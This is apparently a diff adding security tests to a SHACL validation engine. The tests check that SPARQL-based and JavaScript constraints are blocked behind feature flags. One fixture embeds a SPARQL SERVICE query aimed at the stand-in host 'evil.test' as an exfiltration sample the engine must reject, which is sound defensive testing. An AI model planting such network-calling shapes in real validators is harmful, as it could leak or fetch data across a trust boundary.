@@ -83,6 +83,46 @@ DATA_WITH_S223 = """
 ex:ahu1 a s223:AirHandlingUnit .
 """
 
+SHAPES_WITH_SPARQL_CONSTRAINT = """
+@prefix sh: <http://www.w3.org/ns/shacl#> .
+@prefix ex: <http://example.com/> .
+
+ex:PersonShape
+    a sh:NodeShape ;
+    sh:targetClass ex:Person ;
+    sh:sparql [
+        sh:message "Person must be query-compatible." ;
+        sh:select "SELECT $this WHERE { $this a ex:Person . }" ;
+    ] .
+"""
+
+SHAPES_WITH_SERVICE_CONSTRAINT = """
+@prefix sh: <http://www.w3.org/ns/shacl#> .
+@prefix ex: <http://example.com/> .
+
+ex:PersonShape
+    a sh:NodeShape ;
+    sh:targetClass ex:Person ;
+    sh:sparql [
+        sh:message "Do not exfiltrate." ;
+        sh:select '''SELECT $this WHERE {
+            SERVICE <https://evil.test/sparql> { ?s ?p ?o }
+        }''' ;
+    ] .
+"""
+
+SHAPES_WITH_JS_CONSTRAINT = """
+@prefix sh: <http://www.w3.org/ns/shacl#> .
+@prefix ex: <http://example.com/> .
+
+ex:PersonShape
+    a sh:NodeShape ;
+    sh:targetClass ex:Person ;
+    sh:js [
+        sh:jsFunctionName "validate" ;
+    ] .
+"""
+
 
 # ════════════════════════════════════════════════════════════════════════════
 # parse_rdf
@@ -428,6 +468,72 @@ class TestRunShaclValidation:
         assert results is None
         assert err is not None
         assert "triple" in err.lower()
+
+    def test_advanced_construct_rejected_when_step_toggle_off(self):
+        """Embedded SHACL SPARQL cannot run unless the step opted into it.
+
+        This protects the basic-validator path from silently executing
+        SHACL-AF content when an author uploads a mixed shape bundle.
+        """
+        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
+        results, err = engine.run_shacl_validation(
+            data_graph,
+            SHAPES_WITH_SPARQL_CONSTRAINT,
+            "",
+            inference_mode="none",
+            advanced_shacl=False,
+        )
+        assert results is None
+        assert err is not None
+        assert "advanced shacl" in err.lower()
+
+    def test_advanced_construct_rejected_when_deployment_flag_off(self):
+        """The deployment gate blocks SHACL-AF even if the step asks for it.
+
+        Workflow authors are not enough of a trust boundary for cloud
+        execution; operators must explicitly enable advanced features
+        for isolated/trusted deployments.
+        """
+        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
+        results, err = engine.run_shacl_validation(
+            data_graph,
+            SHAPES_WITH_SPARQL_CONSTRAINT,
+            "",
+            inference_mode="none",
+            advanced_shacl=True,
+        )
+        assert results is None
+        assert err is not None
+        assert "SHACL_ENABLE_ADVANCED_FEATURES" in err
+
+    @override_settings(SHACL_ENABLE_ADVANCED_FEATURES=True)
+    def test_embedded_sparql_service_rejected_even_when_advanced_allowed(self):
+        """Advanced deployments still reject network-capable SPARQL clauses."""
+        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
+        results, err = engine.run_shacl_validation(
+            data_graph,
+            SHAPES_WITH_SERVICE_CONSTRAINT,
+            "",
+            inference_mode="none",
+            advanced_shacl=True,
+        )
+        assert results is None
+        assert err is not None
+        assert "SERVICE" in err
+
+    def test_shacl_js_rejected_unconditionally(self):
+        """SHACL-JS is executable code and is not part of the v1 surface."""
+        data_graph, _ = engine.parse_rdf(DATA_PASSING, "turtle")
+        results, err = engine.run_shacl_validation(
+            data_graph,
+            SHAPES_WITH_JS_CONSTRAINT,
+            "",
+            inference_mode="none",
+            advanced_shacl=True,
+        )
+        assert results is None
+        assert err is not None
+        assert "SHACL-JS" in err
 
 
 # ════════════════════════════════════════════════════════════════════════════
